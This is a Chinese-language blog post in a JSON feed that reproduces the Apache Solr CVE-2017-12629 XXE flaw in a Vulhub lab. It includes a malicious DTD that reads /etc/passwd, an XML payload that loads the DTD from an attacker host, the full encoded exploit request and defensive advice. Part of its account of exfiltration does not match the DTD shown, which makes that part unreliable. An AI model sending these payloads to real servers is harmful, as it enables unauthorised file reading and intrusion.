{
    "version": "https://jsonfeed.org/version/1",
    "title": "bae的博客 • All posts by \"solr\" tag",
    "description": "bae的个人博客",
    "home_page_url": "https://bae-ace.github.io",
    "items": [
        {
            "id": "https://bae-ace.github.io/2025/08/01/Apache-Solr-CVE-2017-12629-XXE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub%EF%BC%89/",
            "url": "https://bae-ace.github.io/2025/08/01/Apache-Solr-CVE-2017-12629-XXE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub%EF%BC%89/",
            "title": "Apache Solr CVE-2017-12629 XXE 漏洞复现与利用（基于 Vulhub）",
            "date_published": "2025-08-01T09:54:17.000Z",
            "content_html": "<h1 id=\"深入剖析-Apache-Solr-CVE-2017-12629-XXE-漏洞（基于-Vulhub）\"><a href=\"#深入剖析-Apache-Solr-CVE-2017-12629-XXE-漏洞（基于-Vulhub）\" class=\"headerlink\" title=\"深入剖析 Apache Solr CVE-2017-12629 XXE 漏洞（基于 Vulhub）\"></a>深入剖析 Apache Solr CVE-2017-12629 XXE 漏洞（基于 Vulhub）</h1><h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p><strong>CVE-2017-12629</strong> 是一个影响 Apache Solr 的 **XML 外部实体注入（XXE）**漏洞，允许攻击者通过构造恶意的 XML 输入，加载外部实体或敏感文件，从而导致信息泄露或进一步攻击。该漏洞难度中等偏上，需要结合远程 DTD（文档类型定义）加载和外带技术进行利用。本文基于 <strong>Vulhub</strong> 靶场和 <strong>Kali Linux</strong> 环境，详细复现该漏洞，涵盖环境搭建、原理分析、利用流程及防护建议，旨在帮助安全从业者深入理解 XXE 漏洞的危害与利用方式。</p>\n<p>本文将重点讲解：</p>\n<ul>\n<li>漏洞触发原理及利用链</li>\n<li>远程 DTD 构造与外带攻击</li>\n<li>完整的攻击请求构造与验证</li>\n<li>防护措施与注意事项</li>\n</ul>\n<hr>\n<h2 id=\"二、漏洞概述\"><a href=\"#二、漏洞概述\" class=\"headerlink\" title=\"二、漏洞概述\"></a>二、漏洞概述</h2><ul>\n<li><strong>漏洞编号</strong>：CVE-2017-12629</li>\n<li><strong>漏洞类型</strong>：XXE（XML External Entity Injection）</li>\n<li><strong>影响版本</strong>：Apache Solr &lt; 7.1.0</li>\n<li><strong>测试平台</strong>：Vulhub + Kali Linux</li>\n<li><strong>难度</strong>：中等偏上（需构造远程 DTD 和外带攻击）</li>\n<li><strong>危害</strong>：<ul>\n<li>读取服务器敏感文件（如 <code>/etc/passwd</code>）</li>\n<li>触发内网资源访问，潜在导致 SSRF</li>\n<li>结合其他漏洞进一步提权或控制服务器</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h2 id=\"三、环境搭建\"><a href=\"#三、环境搭建\" class=\"headerlink\" title=\"三、环境搭建\"></a>三、环境搭建</h2><h3 id=\"1-前提准备\"><a href=\"#1-前提准备\" class=\"headerlink\" title=\"1. 前提准备\"></a>1. 前提准备</h3><p>确保以下环境已就绪：</p>\n<ul>\n<li><strong>操作系统</strong>：Kali Linux</li>\n<li><strong>网络配置</strong>：<ul>\n<li>NAT 模式（访问外部网络）</li>\n<li>仅主机模式（Host-Only，Kali IP：<code>192.168.56.1</code>，靶机 IP：<code>192.168.56.102</code>）</li>\n</ul>\n</li>\n<li><strong>工具</strong>：<ul>\n<li>已安装 Docker 和 Docker Compose</li>\n<li>Burp Suite（用于抓包和构造请求）</li>\n<li>Python3（用于托管 DTD 文件）</li>\n</ul>\n</li>\n<li><strong>靶场</strong>：Vulhub 的 Apache Solr CVE-2017-12629 环境<ul>\n<li>访问地址：<code>http://192.168.56.102:8983/solr/#/</code></li>\n<li>确保靶场已成功部署（参考 Vulhub 官方文档或前文）</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"2-启动-Vulhub-靶场\"><a href=\"#2-启动-Vulhub-靶场\" class=\"headerlink\" title=\"2. 启动 Vulhub 靶场\"></a>2. 启动 Vulhub 靶场</h3><ol>\n<li>克隆 Vulhub 项目（若未下载）：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/vulhub/vulhub.git<br><span class=\"hljs-built_in\">cd</span> vulhub/solr/CVE-2017-12629<br></code></pre></td></tr></table></figure></li>\n<li>启动 Docker 容器：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker-compose up -d<br></code></pre></td></tr></table></figure></li>\n<li>验证环境：<ul>\n<li>访问 <code>http://192.168.56.102:8983/solr/#/</code>，若看到 Solr 管理界面，说明部署成功 。</li>\n</ul>\n</li>\n<li>管理容器：<ul>\n<li>查看容器：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker ps<br></code></pre></td></tr></table></figure></li>\n<li>停止容器：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker-compose down<br></code></pre></td></tr></table></figure></li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"四、漏洞原理\"><a href=\"#四、漏洞原理\" class=\"headerlink\" title=\"四、漏洞原理\"></a>四、漏洞原理</h2><h3 id=\"1-XXE-漏洞简介\"><a href=\"#1-XXE-漏洞简介\" class=\"headerlink\" title=\"1. XXE 漏洞简介\"></a>1. XXE 漏洞简介</h3><p>XXE（XML External Entity Injection）是一种 XML 解析器漏洞，攻击者通过注入恶意 XML 实体，诱导解析器加载外部资源（如本地文件或远程 DTD），从而实现文件读取或网络请求。Apache Solr 的查询接口允许用户提交 XML 格式的参数，且未禁用外部实体解析，导致 XXE 漏洞。</p>\n<h3 id=\"2-漏洞触发点\"><a href=\"#2-漏洞触发点\" class=\"headerlink\" title=\"2. 漏洞触发点\"></a>2. 漏洞触发点</h3><p>Solr 的漏洞入口位于以下接口：</p>\n<figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs dts\"><span class=\"hljs-keyword\">/solr/</span>demo/select?q=<span class=\"hljs-params\">&lt;XML_Payload&gt;</span><span class=\"hljs-variable\">&amp;wt</span>=xml<span class=\"hljs-variable\">&amp;</span>defT<span class=\"hljs-attr\">ype</span><span class=\"hljs-operator\">=</span>xmlparser<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>参数说明</strong>：<ul>\n<li><code>q</code>：查询参数，接受 XML 格式的输入。</li>\n<li><code>wt=xml</code>：指定响应格式为 XML。</li>\n<li><code>defType=xmlparser</code>：启用 XML 解析器，触发 XXE。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"3-漏洞限制\"><a href=\"#3-漏洞限制\" class=\"headerlink\" title=\"3. 漏洞限制\"></a>3. 漏洞限制</h3><ul>\n<li><strong>无回显</strong>：Solr 不直接回显实体内容（如 <code>/etc/passwd</code>），需通过外带（Out-of-Band, OOB）技术利用。</li>\n<li><strong>外带攻击</strong>：通过构造远程 DTD，诱导 Solr 访问攻击者控制的服务器，从而间接读取目标文件。</li>\n</ul>\n<h3 id=\"4-利用链\"><a href=\"#4-利用链\" class=\"headerlink\" title=\"4. 利用链\"></a>4. 利用链</h3><figure class=\"highlight crmsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs crmsh\">用户提交 <span class=\"hljs-keyword\">XML</span> <span class=\"hljs-title\">Payload</span> -&gt; Solr <span class=\"hljs-keyword\">XML</span> <span class=\"hljs-title\">解析器解析 -&gt; 加载远程 DTD</span> -&gt; 引用本地文件（如 /etc/passwd） -&gt; 外带至攻击者服务器<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"五、漏洞利用流程\"><a href=\"#五、漏洞利用流程\" class=\"headerlink\" title=\"五、漏洞利用流程\"></a>五、漏洞利用流程</h2><h3 id=\"1-初步访问与抓包\"><a href=\"#1-初步访问与抓包\" class=\"headerlink\" title=\"1. 初步访问与抓包\"></a>1. 初步访问与抓包</h3><ol>\n<li>配置 Burp Suite：<ul>\n<li>打开 Burp Suite，设置代理（默认：<code>127.0.0.1:8080</code>）。</li>\n<li>配置 Firefox 浏览器使用 Burp 代理。</li>\n</ul>\n</li>\n<li>访问 Solr 管理界面：<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">http:<span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.102</span>:<span class=\"hljs-number\">8983</span><span class=\"hljs-regexp\">/solr/</span><span class=\"hljs-comment\">#/</span><br></code></pre></td></tr></table></figure></li>\n<li>在 Burp 中拦截请求，观察典型 GET 请求：<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-keyword\">GET</span> <span class=\"hljs-string\">/solr/</span> <span class=\"hljs-meta\">HTTP/1.1</span><br><span class=\"hljs-attribute\">Host</span><span class=\"hljs-punctuation\">: </span>192.168.56.102:8983<br><span class=\"hljs-attribute\">User-Agent</span><span class=\"hljs-punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)<br><span class=\"hljs-attribute\">Accept</span><span class=\"hljs-punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9<br><span class=\"hljs-attribute\">Connection</span><span class=\"hljs-punctuation\">: </span>close<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"2-构造远程-DTD-文件\"><a href=\"#2-构造远程-DTD-文件\" class=\"headerlink\" title=\"2. 构造远程 DTD 文件\"></a>2. 构造远程 DTD 文件</h3><p>由于 Solr 不回显文件内容，需通过外带攻击加载远程 DTD。</p>\n<h4 id=\"步骤：\"><a href=\"#步骤：\" class=\"headerlink\" title=\"步骤：\"></a>步骤：</h4><ol>\n<li>在 Kali（IP：<code>192.168.56.1</code>）上创建 DTD 文件 <code>test1.dtd</code>：<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs dtd\">&lt;!ENTITY % passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>&lt;!ENTITY % err &quot;&lt;!ENTITY errmsg SYSTEM &#x27;file:///etc/passwd&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure>\n<strong>说明</strong>：<ul>\n<li><code>%passwd</code>：定义实体，尝试读取目标服务器的 <code>/etc/passwd</code>。</li>\n<li><code>%err</code>：嵌套实体，构造 <code>errmsg</code> 引用 <code>%passwd</code>，便于在 XML 中调用。</li>\n</ul>\n</li>\n<li>将 <code>test1.dtd</code> 放入 Kali 的 HTTP 目录（如 <code>/var/www/html/</code>）：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">cp</span> test1.dtd /var/www/html/<br></code></pre></td></tr></table></figure></li>\n<li>启动 HTTP 服务：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">python3 -m http.server 80<br></code></pre></td></tr></table></figure>\n确保 DTD 可通过以下地址访问：<figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs dts\"><span class=\"hljs-symbol\">http:</span><span class=\"hljs-comment\">//192.168.56.1/test1.dtd</span><br></code></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"3-构造-XML-Payload\"><a href=\"#3-构造-XML-Payload\" class=\"headerlink\" title=\"3. 构造 XML Payload\"></a>3. 构造 XML Payload</h3><p>创建以下 XML Payload，引用远程 DTD：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;?xml version=<span class=\"hljs-string\">&quot;1.0&quot;</span> encoding=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-keyword\">root</span> [</span><br><span class=\"hljs-meta\">  <span class=\"hljs-meta\">&lt;!ENTITY % <span class=\"hljs-keyword\">remote</span> <span class=\"hljs-keyword\">SYSTEM</span> <span class=\"hljs-string\">&quot;http://192.168.56.1/test1.dtd&quot;</span>&gt;</span></span><br><span class=\"hljs-meta\">  %remote;</span><br><span class=\"hljs-meta\">  %err;</span><br><span class=\"hljs-meta\">]&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">root</span>&gt;</span><span class=\"hljs-symbol\">&amp;errmsg;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">root</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>说明</strong>：</p>\n<ul>\n<li><code>&lt;!ENTITY % remote SYSTEM &quot;http://192.168.56.1/test1.dtd&quot;&gt;</code>：加载远程 DTD。</li>\n<li><code>%remote;</code>：执行 DTD 中的定义。</li>\n<li><code>%err;</code>：触发嵌套实体，尝试加载 <code>/etc/passwd</code>。</li>\n<li><code>&amp;errmsg;</code>：引用嵌套实体，诱导 Solr 解析。</li>\n</ul>\n<h3 id=\"4-URL-编码-Payload\"><a href=\"#4-URL-编码-Payload\" class=\"headerlink\" title=\"4. URL 编码 Payload\"></a>4. URL 编码 Payload</h3><p>由于 Payload 将通过 GET 参数 <code>q</code> 提交，需进行 URL 编码。使用 Python 脚本生成编码后的 Payload：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> urllib.parse<br><br>payload = <span class=\"hljs-string\">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"hljs-string\">&lt;!DOCTYPE root [</span><br><span class=\"hljs-string\">  &lt;!ENTITY % remote SYSTEM &quot;http://192.168.56.1/test1.dtd&quot;&gt;</span><br><span class=\"hljs-string\">  %remote;</span><br><span class=\"hljs-string\">  %err;</span><br><span class=\"hljs-string\">]&gt;</span><br><span class=\"hljs-string\">&lt;root&gt;&amp;errmsg;&lt;/root&gt;&#x27;&#x27;&#x27;</span><br><br>encoded_payload = urllib.parse.quote(payload)<br><span class=\"hljs-built_in\">print</span>(encoded_payload)<br></code></pre></td></tr></table></figure>\n\n<p><strong>示例输出</strong>（部分）：</p>\n<figure class=\"highlight llvm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\"><span class=\"hljs-variable\">%3</span>C<span class=\"hljs-variable\">%3</span>Fxml<span class=\"hljs-variable\">%20</span>version<span class=\"hljs-variable\">%3</span>D<span class=\"hljs-variable\">%221</span>.<span class=\"hljs-number\">0</span><span class=\"hljs-variable\">%22</span><span class=\"hljs-variable\">%20</span>encoding<span class=\"hljs-variable\">%3</span>D<span class=\"hljs-variable\">%22</span>UTF<span class=\"hljs-number\">-8</span><span class=\"hljs-variable\">%22</span><span class=\"hljs-variable\">%3</span>F<span class=\"hljs-variable\">%3</span>E<span class=\"hljs-variable\">%0</span>A<span class=\"hljs-variable\">%3</span>C<span class=\"hljs-title\">!DOCTYPE</span><span class=\"hljs-variable\">%20</span>root<span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%5</span>B<span class=\"hljs-variable\">%0</span>A<span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%3</span>C<span class=\"hljs-title\">!ENTITY</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%25</span><span class=\"hljs-variable\">%20</span>remote<span class=\"hljs-variable\">%20</span>SYSTEM<span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%22</span>http<span class=\"hljs-variable\">%3</span>A<span class=\"hljs-variable\">%2</span>F<span class=\"hljs-variable\">%2</span>F<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.1</span><span class=\"hljs-variable\">%2</span>Ftest<span class=\"hljs-number\">1</span>.dtd<span class=\"hljs-variable\">%22</span><span class=\"hljs-variable\">%3</span>E<span class=\"hljs-variable\">%0</span>A<span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%25</span>remote<span class=\"hljs-variable\">%3</span>B<span class=\"hljs-variable\">%0</span>A<span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%25</span>err<span class=\"hljs-variable\">%3</span>B<span class=\"hljs-variable\">%0</span>A<span class=\"hljs-variable\">%5</span>D<span class=\"hljs-variable\">%3</span>E<span class=\"hljs-variable\">%0</span>A<span class=\"hljs-variable\">%3</span>Croot<span class=\"hljs-variable\">%3</span>E<span class=\"hljs-variable\">%26</span>errmsg<span class=\"hljs-variable\">%3</span>B<span class=\"hljs-variable\">%3</span>C<span class=\"hljs-variable\">%2</span>Froot<span class=\"hljs-variable\">%3</span>E<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-构造最终攻击请求\"><a href=\"#5-构造最终攻击请求\" class=\"headerlink\" title=\"5. 构造最终攻击请求\"></a>5. 构造最终攻击请求</h3><p>使用 Burp Suite 的 Repeater 模块，构造以下 GET 请求：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-keyword\">GET</span> <span class=\"hljs-string\">/solr/demo/select?q=&lt;Encoded_Payload&gt;&amp;wt=xml&amp;defType=xmlparser</span> <span class=\"hljs-meta\">HTTP/1.1</span><br><span class=\"hljs-attribute\">Host</span><span class=\"hljs-punctuation\">: </span>192.168.56.102:8983<br><span class=\"hljs-attribute\">User-Agent</span><span class=\"hljs-punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)<br><span class=\"hljs-attribute\">Accept</span><span class=\"hljs-punctuation\">: </span>*/*<br><span class=\"hljs-attribute\">Connection</span><span class=\"hljs-punctuation\">: </span>close<br></code></pre></td></tr></table></figure>\n\n<p><strong>完整示例</strong>（替换 <code>&lt;Encoded_Payload&gt;</code> 为实际编码结果）：</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">GET</span> /solr/demo/select?q=%<span class=\"hljs-number\">3</span>C%<span class=\"hljs-number\">3</span>Fxml%<span class=\"hljs-number\">20</span>version%<span class=\"hljs-number\">3</span>D%<span class=\"hljs-number\">221</span>.<span class=\"hljs-number\">0</span>%<span class=\"hljs-number\">22</span>%<span class=\"hljs-number\">20</span>encoding%<span class=\"hljs-number\">3</span>D%<span class=\"hljs-number\">22</span>UTF-<span class=\"hljs-number\">8</span>%<span class=\"hljs-number\">22</span>%<span class=\"hljs-number\">3</span>F%<span class=\"hljs-number\">3</span>E%<span class=\"hljs-number\">0</span>A%<span class=\"hljs-number\">3</span>C!DOCTYPE%<span class=\"hljs-number\">20</span>root%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">5</span>B%<span class=\"hljs-number\">0</span>A%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">3</span>C!ENTITY%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">25</span>%<span class=\"hljs-number\">20</span>remote%<span class=\"hljs-number\">20</span>SYSTEM%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">22</span>http%<span class=\"hljs-number\">3</span>A%<span class=\"hljs-number\">2</span>F%<span class=\"hljs-number\">2</span>F<span class=\"hljs-number\">192.168.56.1</span>%<span class=\"hljs-number\">2</span>Ftest1.dtd%<span class=\"hljs-number\">22</span>%<span class=\"hljs-number\">3</span>E%<span class=\"hljs-number\">0</span>A%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">25</span>remote%<span class=\"hljs-number\">3</span>B%<span class=\"hljs-number\">0</span>A%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">25</span>err%<span class=\"hljs-number\">3</span>B%<span class=\"hljs-number\">0</span>A%<span class=\"hljs-number\">5</span>D%<span class=\"hljs-number\">3</span>E%<span class=\"hljs-number\">0</span>A%<span class=\"hljs-number\">3</span>Croot%<span class=\"hljs-number\">3</span>E%<span class=\"hljs-number\">26</span>errmsg%<span class=\"hljs-number\">3</span>B%<span class=\"hljs-number\">3</span>C%<span class=\"hljs-number\">2</span>Froot%<span class=\"hljs-number\">3</span>E&amp;wt=xml&amp;defType=xmlparser HTTP/<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">1</span><br><span class=\"hljs-attribute\">Host</span>: <span class=\"hljs-number\">192.168.56.102:8983</span><br><span class=\"hljs-attribute\">User</span>-Agent: Mozilla/<span class=\"hljs-number\">5</span>.<span class=\"hljs-number\">0</span> (Windows NT <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">0</span>; Win64; x64)<br><span class=\"hljs-attribute\">Accept</span>: */*<br><span class=\"hljs-attribute\">Connection</span>: close<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-验证攻击效果\"><a href=\"#6-验证攻击效果\" class=\"headerlink\" title=\"6. 验证攻击效果\"></a>6. 验证攻击效果</h3><ol>\n<li>发送请求后，观察 Kali 的 HTTP 服务日志：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">192.168.56.102 - - [01/Aug/2025 17:52:25] <span class=\"hljs-string\">&quot;GET /test1.dtd HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure>\n如果看到 Solr（<code>192.168.56.102</code>）访问了 <code>test1.dtd</code>，说明 DTD 被成功加载。</li>\n<li>由于 Solr 不回显 <code>/etc/passwd</code> 内容，攻击成功仅表现为 DTD 请求到达攻击者服务器，间接证明 XXE 触发。</li>\n</ol>\n<hr>\n<h2 id=\"六、原理深入分析\"><a href=\"#六、原理深入分析\" class=\"headerlink\" title=\"六、原理深入分析\"></a>六、原理深入分析</h2><h3 id=\"1-利用链条\"><a href=\"#1-利用链条\" class=\"headerlink\" title=\"1. 利用链条\"></a>1. 利用链条</h3><ul>\n<li><strong>用户输入</strong>：提交包含外部实体的 XML Payload。</li>\n<li><strong>Solr 解析</strong>：<code>defType=xmlparser</code> 触发 XML 解析器处理 <code>q</code> 参数。</li>\n<li><strong>加载 DTD</strong>：解析器访问远程 DTD（<code>http://192.168.56.1/test1.dtd</code>）。</li>\n<li><strong>引用文件</strong>：DTD 中的实体尝试加载本地文件（如 <code>/etc/passwd</code>）。</li>\n<li><strong>外带请求</strong>：通过嵌套实体，Solr 发起对攻击者服务器的请求，携带文件内容或触发日志。</li>\n</ul>\n<h3 id=\"2-关键点\"><a href=\"#2-关键点\" class=\"headerlink\" title=\"2. 关键点\"></a>2. 关键点</h3><ul>\n<li><strong><code>defType=xmlparser</code></strong>：启用 Solr 的 XML 解析器，是触发 XXE 的核心。</li>\n<li><strong>远程 DTD</strong>：绕过 Solr 无回显限制，通过外带技术验证文件读取。</li>\n<li><strong>嵌套实体</strong>：通过 <code>%err</code> 和 <code>&amp;errmsg;</code> 构造复杂实体链，确保文件被引用。</li>\n</ul>\n<h3 id=\"3-限制与挑战\"><a href=\"#3-限制与挑战\" class=\"headerlink\" title=\"3. 限制与挑战\"></a>3. 限制与挑战</h3><ul>\n<li><strong>无回显</strong>：需依赖外带技术，增加利用复杂度。</li>\n<li><strong>网络限制</strong>：目标服务器需允许出站 HTTP 请求，否则 DTD 无法加载。</li>\n<li><strong>DTD 构造</strong>：需要精确定义实体，避免解析错误。</li>\n</ul>\n<hr>\n<h2 id=\"七、防护建议\"><a href=\"#七、防护建议\" class=\"headerlink\" title=\"七、防护建议\"></a>七、防护建议</h2><ol>\n<li><p><strong>升级 Solr 版本</strong></p>\n<ul>\n<li>升级到 Apache Solr 7.1.0 或更高版本，官方已修复 XXE 漏洞。</li>\n<li>定期检查 Solr 更新，应用最新补丁。</li>\n</ul>\n</li>\n<li><p><strong>禁用 XML 解析器</strong></p>\n<ul>\n<li>禁用 <code>defType=xmlparser</code>，或限制对 <code>/solr/demo/select</code> 接口的访问。</li>\n<li>在 Solr 配置文件中关闭不必要的查询解析器。</li>\n</ul>\n</li>\n<li><p><strong>限制出站网络请求</strong></p>\n<ul>\n<li>配置防火墙，阻止 Solr 实例访问外部 HTTP 资源。</li>\n<li>使用网络策略（如 iptables）限制出站流量。</li>\n</ul>\n</li>\n<li><p><strong>启用 WAF</strong></p>\n<ul>\n<li>部署 Web 应用防火墙，检测包含 <code>&lt;!DOCTYPE</code> 或 <code>&lt;!ENTITY</code> 的 XML 请求。</li>\n<li>配置正则规则，拦截潜在 XXE Payload。</li>\n</ul>\n</li>\n<li><p><strong>安全编码</strong></p>\n<ul>\n<li>在开发中禁用 XML 外部实体解析，例如：<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-type\">DocumentBuilderFactory</span> <span class=\"hljs-variable\">dbf</span> <span class=\"hljs-operator\">=</span> DocumentBuilderFactory.newInstance();<br>dbf.setFeature(<span class=\"hljs-string\">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class=\"hljs-literal\">true</span>);<br></code></pre></td></tr></table></figure></li>\n<li>使用安全的 XML 解析库（如 SAX 或 DOM4J）。</li>\n</ul>\n</li>\n<li><p><strong>日志监控</strong></p>\n<ul>\n<li>定期检查 Solr 日志，关注异常的 XML 解析请求。</li>\n<li>监控出站网络流量，及时发现外带攻击。</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"八、总结\"><a href=\"#八、总结\" class=\"headerlink\" title=\"八、总结\"></a>八、总结</h2><table>\n<thead>\n<tr>\n<th>项目</th>\n<th>信息</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>漏洞编号</strong></td>\n<td>CVE-2017-12629</td>\n</tr>\n<tr>\n<td><strong>漏洞类型</strong></td>\n<td>XXE（XML 外部实体注入）</td>\n</tr>\n<tr>\n<td><strong>影响版本</strong></td>\n<td>Apache Solr &lt; 7.1.0</td>\n</tr>\n<tr>\n<td><strong>利用方式</strong></td>\n<td>远程 DTD + 外带攻击</td>\n</tr>\n<tr>\n<td><strong>关键点</strong></td>\n<td><code>defType=xmlparser</code> 触发 XML 解析</td>\n</tr>\n<tr>\n<td><strong>测试平台</strong></td>\n<td>Vulhub + Kali Linux</td>\n</tr>\n<tr>\n<td><strong>危害</strong></td>\n<td>敏感文件读取、内网探测</td>\n</tr>\n</tbody></table>\n<p>Apache Solr CVE-2017-12629 XXE 漏洞展示了 XML 解析器开放外部实体解析的严重安全隐患。虽然利用过程因无回显和网络限制较为复杂，但通过远程 DTD 和外带技术，攻击者可成功读取目标服务器的敏感文件（如 <code>/etc/passwd</code>）。开发者应及时升级 Solr 版本、禁用不安全的解析器、限制出站请求，并配合 WAF 和日志监控，构建多层次防御体系。</p>\n<blockquote>\n<p><strong>免责声明</strong>：本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。</p>\n</blockquote>\n<p>“渗透测试的艺术在于：构造、验证、提权、保持优雅”</p>\n",
            "tags": [
                "Web安全",
                "XXE",
                "漏洞复现",
                "Solr",
                "Vulhub",
                "Kali"
            ]
        }
    ]
}